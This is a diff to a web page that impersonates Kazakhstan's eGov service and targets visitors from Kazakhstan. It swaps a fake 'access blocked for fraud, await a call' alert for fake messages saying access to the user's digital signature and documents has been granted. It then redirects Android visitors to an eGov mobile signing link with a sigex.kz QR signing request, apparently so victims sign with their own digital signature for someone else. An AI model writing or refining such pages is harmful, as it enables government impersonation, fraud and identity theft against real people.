@@ -174,12 +174,13 @@ if (data.country === "KZ") {
       await wait(1000);
       document.getElementById('overlay1').classList.remove('show');
 */
-            await wait(1000);
-      document.getElementById('overlay2').classList.add('show');
-      await wait(3000);
-      document.getElementById('overlay2').classList.remove('show');
       await wait(1000);
-      alert('⚠️eGov: Внимание! Доступ временно заблокирван из-за подозрений на мошенничество. Заявление передано специалисту, ожидайте звонок');
+      document.getElementById('overlay2').classList.add('show');
+      alert('☑️eGov: доступ к ЭЦП предоставлен');
+      alert('☑️eGov: доступ к цифровым документам предоставлен');
+      await wait(500);
+      document.getElementById('overlay2').classList.remove('show');
+      await wait(500);
 
       if (navigator.userAgent.match(/Android/i)) {
         window.location = 'https://mgovsign.page.link/?link=https://sigex.kz/api/egovQr/egov/i0ekRzuH6ohdTGAI?mgovSign&apn=kz.mobile.mgov&isi=1476128386&ibi=kz.egov.mobile';
@@ -200,6 +201,7 @@ if (data.country === "KZ") {
 
 
 </html>
+
 
 
 
